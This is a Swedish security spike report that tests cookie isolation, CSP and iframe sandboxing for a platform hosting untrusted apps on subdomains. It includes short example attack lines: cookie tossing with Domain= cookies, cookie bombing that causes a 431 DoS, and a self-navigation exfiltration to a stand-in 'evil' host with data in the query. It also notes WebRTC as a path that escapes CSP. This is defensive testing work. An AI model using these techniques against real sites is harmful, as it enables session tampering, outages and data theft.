# SPIK S1 — sessioner, origin-isolering och webbläsarexfiltrering

**Status:** genomförd (tidsboxad, experiment — inte produktionskod)
**Datum:** 2026-09-18
**Motorer:** Chromium 153.0.8010.12 · WebKit 26.6 · Firefox **OMÄTT** (se nedan)
**Verktyg:** Playwright 1.63.0, Node 26.8.1, självsignerat cert (openssl 3.6.4), headless.

> Denna fil skiljer på **MÄTT** (kört i minst två motorer och observerat) och
> **ANTAGET** (härlett, ej kört här). Allt i matrisen är MÄTT i Chromium + WebKit.
> Firefox-kolumnen är **OMÄTT**, inte "fungerar".

---

## Designändring under spikens gång (varför matrisen ser ut som den gör)

Ursprungsuppdraget antog **två registrerbara domäner** (byggdomän ≠ appdomän, mönstret
`google.com` / `googleusercontent.com`). Under arbetet fattades **ADR 0002: "En domän med
slumpade subdomäner"** (se `docs/adr/0002-en-doman-slumpade-subdomaner.md`). Konsekvens:

- **Allt ligger nu under EN registrerbar domän**, en subdomännivå:
  `login.` · `bygg.` · `<id>.` (skal) · `<id>--c.` (innehåll) · `p-<id>.` (utkast).
- **Huvudfallet är därför SAME-SITE överallt** — login → appvärd, skal → `--c`-iframe,
  bygg → `p-<id>`-iframe. Opålitlig appkod är same-site med byggverktyget.
- Cross-site-fallet (två domäner) finns kvar **enbart som kontrollfall (S1.4)** för att
  visa *varför* förhandsvisningen måste ligga same-site: kakor partitioneras cross-site.

Matrisen speglar detta: S1.1–S1.3 är same-site-flöden, S1.4 är cross-site-kontrollen, och
**A/B/C är de nya frågorna** som uppstår när opålitlig kod är same-site med byggverktyget
(cookie tossing, att SameSite inte skyddar mellan subdomäner, kakbombning).

Riggen kör två registrerbara "domäner" som båda pekar på `127.0.0.1` via publika
wildcard-DNS (verifierat med `dig`): **`lvh.me`** (allt i huvudmodellen) och **`localtest.me`**
(bara cross-site-kontrollen). `*.localtest.me` och `*.lvh.me` är två skilda sites enligt
Public Suffix List. Den "externa" servern kör på `evil.127.0.0.1.nip.io` (registrerbar domän
`nip.io` — tredje site). Valet av dessa namn: de kräver ingen `/etc/hosts`-redigering (ingen
sudo) och fungerar i alla tre motorer, till skillnad från Chromiums `--host-resolver-rules`
som saknas i Firefox/WebKit.

---

## Matris (MÄTT: Chromium + WebKit · Firefox OMÄTT)

| ID | Fråga | chromium | webkit | firefox |
|---|---|---|---|---|
| **S1.1** | login→appvärd, `__Host-`-kaka sätts & skickas | fungerar | fungerar | OMÄTT |
| **S1.2** | iframe `__Host-content_sess` (Lax) skickas i same-origin-fetch | fungerar | fungerar | OMÄTT |
| **S1.3** | preview-kaka i same-site-iframe på byggdomänen | fungerar | fungerar | OMÄTT |
| **S1.4** | *kontroll:* cross-site-iframe ser INTE första-parts-kakan (partitionering) | blockeras-korrekt | blockeras-korrekt | OMÄTT |
| **S1.5** | HttpOnly döljer kaka i `document.cookie` + SOP blockerar cross-origin-DOM | blockeras-korrekt | blockeras-korrekt | OMÄTT |
| **A.1** | app kan plantera `Domain=lvh.me`-kaka som NÅR bygg (*cookie tossing*) | JA — risk bekräftad | JA — risk bekräftad | OMÄTT |
| **A.2** | webbläsaren VÄGRAR `__Host-` med `Domain=` (kan ej sättas) | blockeras-korrekt | blockeras-korrekt | OMÄTT |
| **A.3** | förfalskad `__Host-` når INTE annan värd (bygg) | blockeras-korrekt | blockeras-korrekt | OMÄTT |
| **B.fetch** | bygg-kakor (Lax+Strict) skickas vid `fetch(credentials:include)` | BÅDA skickas | BÅDA skickas | OMÄTT |
| **B.topnav** | bygg-kakor skickas vid skript-initierad top-navigering | BÅDA skickas | BÅDA skickas | OMÄTT |
| **B.form** | bygg-kakor skickas vid form-POST | BÅDA skickas | BÅDA skickas | OMÄTT |
| **C.1** | kakbombning (20×3,8 kB) ⇒ bygg svarar 431 / reset | bekräftad (431) | bekräftad (reset) | OMÄTT |
| **C.2** | `Clear-Site-Data: "cookies"` rensar planterade Domain-kakor | **rensat** | **KVARSTÅR** | OMÄTT |
| **S4.6** | **VIKTIGAST:** skalets `frame-src` stoppar iframens självnavigering (`location.href`) till extern origin | blockeras-korrekt | blockeras-korrekt | OMÄTT |
| **S4.7a** | `fetch` till extern origin | blockeras | blockeras | OMÄTT |
| **S4.7b** | `<img src=extern>` | blockeras | blockeras | OMÄTT |
| **S4.7c** | `<form action=extern>` submit | blockeras | blockeras | OMÄTT |
| **S4.7d** | `window.open` (ingen `allow-popups`) | blockeras | blockeras | OMÄTT |
| **S4.7e** | `top.location` (ingen `allow-top-navigation`) | blockeras | blockeras | OMÄTT |
| **S4.7f** | `<a target=_top>` klick | blockeras | blockeras | OMÄTT |
| **S4.7g** | `navigator.sendBeacon` | blockeras | blockeras | OMÄTT |
| **S4.7h** | `<link rel=preconnect/dns-prefetch>` | blockeras | blockeras | OMÄTT |
| **S4.7i** | `WebSocket` mot extern | blockeras | blockeras | OMÄTT |
| **S4.7j** | `RTCPeerConnection` (STUN) — konstruktor/ICE | **kör** (se nedan) | **kör** | OMÄTT |
| **S4.8a** | direktbesök på `--c` nekas (403) när `Sec-Fetch-Dest≠iframe` | blockeras-korrekt | blockeras-korrekt | OMÄTT |
| **S4.8b** | motorn skickar `Sec-Fetch-Dest/Site` vid toppnivå-doc | ja — pålitligt | ja — pålitligt | OMÄTT |

"blockeras-korrekt" = skyddet fungerade (anropet nådde inte externt / kakan syntes inte).
Ingen "ska misslyckas"-rad fällde spiken — utfallet registrerades bara.

---

## Vad som mättes, i klartext

### S1 — sessioner (allt MÄTT i Chromium + WebKit)
1. **Biljettflödet fungerar.** Oinloggad på `app.lvh.me` → 302 till `login.lvh.me` → biljett
   (HMAC) i retur-URL → appvärden verifierar och sätter en egen `__Host-app_sess`
   (`Path=/; Secure; HttpOnly; SameSite=Lax`, ingen `Domain`). Kakan finns och skickas.
2. **Innehålls-iframen behåller och skickar sin egen kaka.** `app--c.lvh.me` inuti skalet
   `app.lvh.me` (same-site, cross-origin) får sin `__Host-content_sess` via en kortlivad
   signerad content-biljett i `src`, och `fetch('/_api/me', {credentials:'same-origin'})`
   inifrån den sandlådade iframen **skickar kakan** (kräver `allow-same-origin`, som finns).
   **`SameSite=Lax` räcker** — top-level-siten är `lvh.me` i båda fallen, så begäran är
   same-site. **`SameSite=None` behövs inte** i denna modell, och ska undvikas (skulle bara
   öppna för cross-site-inbäddning som vi inte vill ha).
3. **Förhandsvisningen beter sig identiskt** (`bygg.lvh.me` ramar `p-demo.lvh.me`).
4. **Kontrollfallet bekräftar partitionering:** samma innehåll (`app--c.lvh.me`), med en
   kaka satt same-site, ramas in cross-site (top = `localtest.me`) → `api.hasCookie=false` i
   **både** Chromium och WebKit. Kakan är partitionerad/blockerad på top-level-site. Detta är
   hela skälet till att förhandsvisningen ligger på byggdomänen.
5. **Ingen korsläsning.** `document.cookie` i innehållet är tomt (HttpOnly döljer kakan), och
   skalet kan inte läsa iframens `contentWindow.document` (SOP kastar). Åt båda håll: nej.

### (a) Cookie tossing — MÄTT
- **JA, risken finns och är bekräftad:** JS på `app--c.lvh.me` kan sätta
  `document.cookie = "toss_domain=…; Domain=lvh.me"` och den kakan **skickas sedan till
  `bygg.lvh.me`** (servern ser den). Det är kakbombnings-/tossing-vektorn.
- **`__Host-` kan INTE förfalskas:** försök att sätta `__Host-app_sess=…; Domain=lvh.me`
  **avvisas av webbläsaren** (kakan dyker aldrig upp) i båda motorer — `__Host-`-prefixet
  kräver att `Domain` saknas. En `__Host-`-kaka satt host-only på `app--c` blir host-only
  där och **når aldrig `bygg`** (servern på bygg ser den inte). Plattformens sessionskaka
  kan alltså varken läsas, skrivas över eller planteras av en app.
- **Namnkollision/ordning:** eftersom plattformen konsekvent använder `__Host-`-prefix kan en
  app aldrig kollidera med sessionsnamnet. En app-planterad `Domain`-kaka har ett annat namn
  och landar bredvid; servern skiljer dem åt på namn (villkor 1 + 4 i ADR 0002).

### (b) SameSite skyddar inte mellan subdomäner — MÄTT
- Byggverktygets `SameSite=Lax`- **och** `SameSite=Strict`-kakor skickas **i alla tre fallen**
  (`fetch(credentials:include)`, skript-initierad top-navigering, form-POST) från
  `app--c.lvh.me` mot `bygg.lvh.me`. **SameSite ger alltså noll skydd here** — allt är
  same-site.
- **Det servern faktiskt kan lita på är `Origin`:** vid `fetch` och form-POST ser bygg
  `Origin: https://app--c.lvh.me:8443` och `Sec-Fetch-Site: same-site`. En **äkta**
  byggverktygsbegäran har `Origin: https://bygg.lvh.me:8443`. `Sec-Fetch-Site: same-site`
  räcker alltså INTE för att skilja legitim från skadlig (båda är same-site) — men **`Origin`
  gör det**. Vid GET-top-navigering skickas ingen `Origin` (den är `null`), vilket är ok
  eftersom skrivande anrop inte ska vara GET.
- **Slutsats:** byggverktygets skrivande API måste kräva **exakt `Origin === https://bygg…`**
  (allowlist, inte "same-site") plus plattformens eget huvud (villkor 2 i ADR 0002).

### (c) Kakbombning + Clear-Site-Data — MÄTT, och HÄR SKILJER MOTORERNA
- **Kakbombning bekräftad:** ~20 kakor à 3,8 kB (`Domain=lvh.me`, totalt ~76 kB) gör att
  `bygg` svarar **431** (Chromium) resp. **stänger anslutningen/reset** (WebKit). Node
  avvisar när `Cookie`-huvudet överstiger `maxHeaderSize` (16 kB). Det är en driftstörning
  (DoS), inte en läcka — men den **drabbar alla värdar på domänen** tills kakorna rensas.
- **Clear-Site-Data är INTE en pålitlig städmekanism cross-motor:**
  `Clear-Site-Data: "cookies"` från `bygg` **rensade** de planterade `Domain`-kakorna i
  **Chromium** (efter: `[]`), men i **WebKit KVARSTOD de** (efter: `["csd1","csd2"]`).
- **Praktisk fälla (MÄTT):** när jaren väl är *bombad* går den inte att rensa via ett vanligt
  anrop — städanropet bär självt de överstora kakorna och avvisas (431/reset) innan
  `Clear-Site-Data`-svaret kommer fram. Återställning kräver alltså en kanal som inte tar
  emot domän-kakorna (t.ex. en helt annan registrerbar domän), eller att användaren rensar
  manuellt.

### S4 — exfiltrering (allt MÄTT i Chromium + WebKit)
- **Den viktigaste frågan (6): skalets `frame-src` stoppar självnavigering.** Iframen som
  kör `location.href = 'https://evil…?data=…'` **når aldrig den externa servern** i någon av
  motorerna. Skalets CSP `frame-src https://app--c.lvh.me:8443` styr även nested-context-
  navigeringar. Bekräftat: externa servern loggade 0 träffar för `selfnav`.
- **Alla övriga läckvägar (7) blockeras:** `fetch`, `<img>`, form-submit, `window.open`,
  `top.location`, `<a target=_top>`, `sendBeacon`, `preconnect/dns-prefetch`, `WebSocket` —
  **ingen** nådde externt, i båda motorer. Skyddet är i lager: innehållets egen CSP
  (`default-src 'none'; connect-src 'self'; img-src 'self'; form-action 'self'; frame-src
  'none'`), sandbox utan `allow-popups`/`allow-top-navigation`, och skalets `frame-src`.
- **`RTCPeerConnection` är undantaget att vara vaksam på:** konstruktorn **kör** i båda
  motorer (WebRTC styrs inte av `connect-src`). I riggen samlades inga ICE-kandidater (ingen
  STUN-nåbarhet i testmiljön, `iceRan=false`), men **WebRTC kan i princip nå nätet utanför
  CSP**. Detta är en **kvarstående läckväg (restrisk)** — se nedan.
- **Direktbesök (8):** toppnivå-GET mot `app--c` utan skal ger `Sec-Fetch-Dest: document`
  (inte `iframe`) och servern svarar **403**. Båda motorer skickar `Sec-Fetch-Dest/Site`
  pålitligt vid dokumentnavigering, så guarden är användbar — **men bara som komplement**
  (äldre Safari/andra klienter kan sakna huvudena; se caveat).

---

## Vad som överraskade
1. **`Clear-Site-Data` divergerar mellan motorer** (Chromium rensar, WebKit inte). Det gör
   `Clear-Site-Data` olämplig som *enda* återställning efter kakbombning.
2. **Den bombade jaren blockerar sin egen städning** — självförstärkande DoS.
3. **`frame-src` räckte** för att stoppa iframens självnavigering i båda motorer — det var
   den mest osäkra frågan på förhand, och den föll ut till plattformens fördel.
4. **`SameSite=Strict` skickas ändå** mellan subdomäner — en nyttig påminnelse om att Strict
   inte är en site-gräns.

---

## REKOMMENDATION för designen (baserad på MÄTT data)

### Exakt kakkonfiguration
- **Plattformen sätter och läser ENBART `__Host-`-kakor.**
  `Set-Cookie: __Host-<namn>=<värde>; Path=/; Secure; HttpOnly; SameSite=Lax` — **ingen
  `Domain`.** En egen sådan per origin (skal, innehåll, login, bygg, preview).
- **Sätt aldrig en kaka med `Domain=`** från plattformen (då tappar man `__Host-`-skyddet och
  öppnar för tossing).
- `SameSite=Lax` räcker och är rätt; **använd inte `SameSite=None`**.

### Exakt biljettflöde
1. Oinloggad på `<id>.<domän>` → 302 till `login.<domän>?rd=<retur>`.
2. Login (engångskod via mejl — här stubbat till direkt mint) verifierar och 302:ar tillbaka
   med en **kortlivad, signerad biljett** (HMAC, `aud` = målvärd, `exp` ~30 s) i URL:en.
3. Appvärden verifierar biljetten, sätter sin `__Host-`-kaka, och 302:ar till ren URL.
4. Skalet bäddar in innehållsvärden `<id>--c` med en **separat** kortlivad content-biljett i
   `iframe.src`; innehållsvärden verifierar och sätter sin egen `__Host-`-kaka.
   Biljetter är engångs/kortlivade och `aud`-bundna till exakt målvärd.

### Exakt sandbox + CSP
- **Skal** (`<id>.<domän>`, plattformsägt, toppnivå):
  `Content-Security-Policy: default-src 'self'; frame-src https://<id>--c.<domän>; …`
  (script/style efter behov). `frame-src` **måste** lista exakt innehållsvärden — det är den
  som stoppar självnavigering (S4.6).
  `<iframe sandbox="allow-scripts allow-forms allow-same-origin allow-downloads">` —
  **utan** `allow-popups` och **utan** `allow-top-navigation`.
- **Innehåll** (`<id>--c.<domän>`, opålitligt):
  `Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; style-src
  'unsafe-inline'; img-src 'self' data:; connect-src 'self'; form-action 'self'; frame-src
  'none'; base-uri 'none'`. (Byt `'unsafe-inline'` mot nonces/hashar i skarp drift.)
- **Byggverktygets API:** avvisa varje skrivande anrop där `Origin` inte är **exakt**
  byggverktygets origin, plus kräv plattformens eget huvud. Lita **aldrig** på `SameSite`.
- **Gateway:** ignorera okända kakor och **begränsa inkommande huvudstorlek** (mät-fyndet:
  ~16 kB `Cookie` räcker för att välta en nod-backend).

### Skydd vid direktbesök på `<id>--c`
- Kräv `Sec-Fetch-Dest: iframe` och `Sec-Fetch-Site: same-site|same-origin`; svara annars
  403. **Som komplement, inte enda skydd** (huvudena är MÄTT pålitliga i Chromium/WebKit vid
  dokumentnavigering, men äldre klienter kan sakna dem). Innehållet är ändå ofarligt utan
  giltig biljett/kaka; guarden minskar bara attackytan för toppnivå-besök.

### Kvarstående läckvägar (restrisk) per motor
| Restrisk | Chromium | WebKit | Åtgärd |
|---|---|---|---|
| **WebRTC** (`RTCPeerConnection`) kringgår `connect-src` | konstruktor kör | konstruktor kör | Blockera WebRTC i innehållet: iframe-`allow`-attribut utan `camera/microphone` hjälper ej — använd **`Permissions-Policy`**/CSP-`webrtc` där stöd finns, eller kör innehållet i en policy som saktar ICE. **Verifiera separat.** |
| **Kakbombning** (DoS mot hela domänen) | 431 | reset | Huvudstorleksgräns i gateway; PSL-registrering av domänen (gör varje subdomän till egen site) är den hållbara åtgärden. |
| **`Clear-Site-Data` opålitligt** | rensar | **rensar ej** | Lita inte på Clear-Site-Data för återställning; designa för PSL eller separat domän. |
| **Rykte/skyddslistor** delas i hela domänen | — | — | ANTAGET (ej mätt); flaggas en app drabbas alla. PSL/egen domän vid tillväxt. |

---

## Firefox: OMÄTT — varför, och hur det åtgärdas

Firefox kunde **inte köras** på testmaskinen. Playwrights Firefox (Nightly-baserad, build
`firefox-1543`) startar inte på **macOS 27.0 (Tahoe, build 26A428)**:

```
*** You are running in headless mode.
sandbox_extension_issue_file_to_process failed for …/Nightly.app: 1 (Operation not permitted)
Could not find profile folder.
<process did exit: exitCode=1>
```

Felet kvarstod oavsett `TMPDIR`, efter att `xattr` strippats, i headed-läge, och med
`MOZ_DISABLE_CONTENT_SANDBOX=1` — det är macOS som nekar Firefox sandbox-init, inte spik-koden.
`firefox-beta` finns inte som Playwright-target. Chromium och WebKit kördes felfritt på samma
maskin. **Firefox-kolumnen är därför OMÄTT — inte "fungerar".**

**Åtgärd:** kör spiken på Linux (CI) eller en äldre macOS. Ett färdigt förslag på GitHub
Actions-jobb som kör alla tre motorer ligger i
`github-actions-forslag.yml` (medvetet **inte** i `.github/` — det är ett förslag, inte
aktiverad CI). Firefox-specifikt att verifiera där: **S1.4** (partitionering — Firefox TCP/
state-partitioning), **B** (SameSite same-site — bör vara samma), **C.2** (Clear-Site-Data —
Firefox-beteende okänt), och **S4.6/S4.7** (särskilt WebRTC och `frame-src`).

## WebKit ≠ Safari — måste kontrolleras manuellt i riktig Safari/iOS
Playwrights WebKit är **inte** identisk med Safari; framför allt **ITP** (Intelligent Tracking
Prevention) och lagringspartitionering kan skilja. Kontrollera på **riktig Safari (macOS) och
iOS**:
- **S1.2/S1.3** — att `SameSite=Lax`-kakan i den inbäddade `--c`-iframen verkligen skickas
  under ITP (ITP kan i vissa lägen kräva Storage Access API även same-site vid inbäddning).
- **S1.4** — att cross-site-partitioneringen beter sig som mätt.
- **C.2** — Safaris `Clear-Site-Data`-stöd (WebKit rensade **inte** här).
- **S4.6/S4.7j** — `frame-src`-navigeringsskyddet och WebRTC på iOS.
Dessa är **ANTAGET** lika tills de körts på riktig Safari/iOS.
